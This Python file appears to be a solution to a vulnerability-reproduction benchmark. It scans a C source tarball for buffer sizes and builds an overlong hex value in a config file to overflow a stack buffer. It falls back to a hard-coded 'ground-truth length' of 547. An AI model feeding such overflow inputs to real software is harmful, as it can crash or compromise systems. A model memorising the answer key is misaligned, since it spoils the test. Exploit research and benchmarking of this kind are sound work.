import os
import tarfile
import tempfile
import subprocess
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze source to understand vulnerability
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find main source file
            source_file = None
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp')):
                        source_file = os.path.join(root, file)
                        break
                if source_file:
                    break
            
            if not source_file:
                # Fallback to known pattern if source not found
                return self.generate_poc(547)
            
            # Analyze source code to understand buffer size
            with open(source_file, 'r') as f:
                content = f.read()
            
            # Look for buffer declarations and hex parsing patterns
            buffer_size = self.analyze_buffer_size(content)
            
            if buffer_size:
                # Generate PoC based on found buffer size
                return self.generate_poc(buffer_size + 100)  # Add overflow margin
            else:
                # Use ground-truth length as fallback
                return self.generate_poc(547)
    
    def analyze_buffer_size(self, content: str) -> int:
        """Analyze source code to find buffer size."""
        patterns = [
            # Look for stack buffer declarations
            r'char\s+\w+\s*\[\s*(\d+)\s*\]',
            r'char\s+\w+\s*\[\s*(\d+)\s*\]\s*;',
            r'char\s+\w+\s*\[\s*(\d+)\s*\]\s*=',
            # Look for memset or similar with size
            r'memset\s*\(\s*\w+\s*,\s*\d+\s*,\s*(\d+)\s*\)',
            r'strncpy\s*\(\s*\w+\s*,\s*\w+\s*,\s*(\d+)\s*\)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                try:
                    size = int(match)
                    if 100 < size < 1000:  # Reasonable buffer size range
                        return size
                except ValueError:
                    continue
        
        # Look for hex-specific parsing functions
        hex_patterns = [
            r'sscanf\s*\(\s*\w+\s*,\s*["\']%x["\']',
            r'strtol\s*\(\s*\w+\s*,\s*NULL\s*,\s*16\s*\)',
        ]
        
        for pattern in hex_patterns:
            if re.search(pattern, content):
                # Common buffer sizes for hex parsing vulnerabilities
                return 512
        
        return None
    
    def generate_poc(self, target_length: int) -> bytes:
        """Generate PoC with specific length."""
        # Create config file header
        config = b"# Configuration file\n"
        config += b"hex_value = 0x"
        
        # Calculate needed hex digits
        header_len = len(config)
        remaining = target_length - header_len
        
        if remaining > 0:
            # Generate long hex value (all 'A's for simplicity)
            # Each 'A' is 1 byte, and we need remaining bytes
            hex_digits = b'A' * remaining
            config += hex_digits
        
        # Ensure exact length
        if len(config) > target_length:
            config = config[:target_length]
        elif len(config) < target_length:
            # Pad with more hex digits
            padding = b'B' * (target_length - len(config))
            config += padding
        
        return config
